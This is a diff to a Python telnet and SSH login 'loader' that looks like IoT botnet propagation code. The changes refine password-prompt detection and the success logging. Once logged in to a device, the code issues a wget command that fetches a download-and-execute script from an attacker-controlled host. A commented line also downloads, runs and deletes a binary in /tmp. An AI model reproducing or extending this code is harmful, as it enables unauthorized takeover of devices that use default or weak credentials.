@@ -31,7 +31,7 @@ def doTelnetLogin(ip, port, user, pass_):
                     asked_password_in_cnx = False
                     user, password = user, pass_
                     tn.write((user + "\n").encode('ascii'))
-                elif "Password:" in str(response) or "password" in str(response):  
+                elif "Password:" in str(response) or "password:" in str(response):  
                     if asked_password_in_cnx and need_user:
                         tn.close()
                         break
@@ -45,7 +45,10 @@ def doTelnetLogin(ip, port, user, pass_):
                     tn.write((password + "\n").encode('ascii'))
                 if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                     # broken
-                    print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
+                    if user!="" and password!="":
+                        print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
+                    else :
+                        print("[loader] Login succeeded --> No required acc&pass")
                     response = tn.read_until(b"#", 1)
                     #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
                     cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
@@ -123,5 +126,6 @@ if __name__ == '__main__':
     #Host_IP, targerIP = read_config_ip()
     #ForceDB(sys.argv[2])
     #doTelnetLogin("192.168.1.121", "23", "root", "password")
-    doSSHLogin("192.168.1.163","22","admin","password")
-    
+    #doTelnetLogin("192.168.0.1","23","","")
+    #doSSHLogin("192.168.1.163","22","admin","password")
+    pass
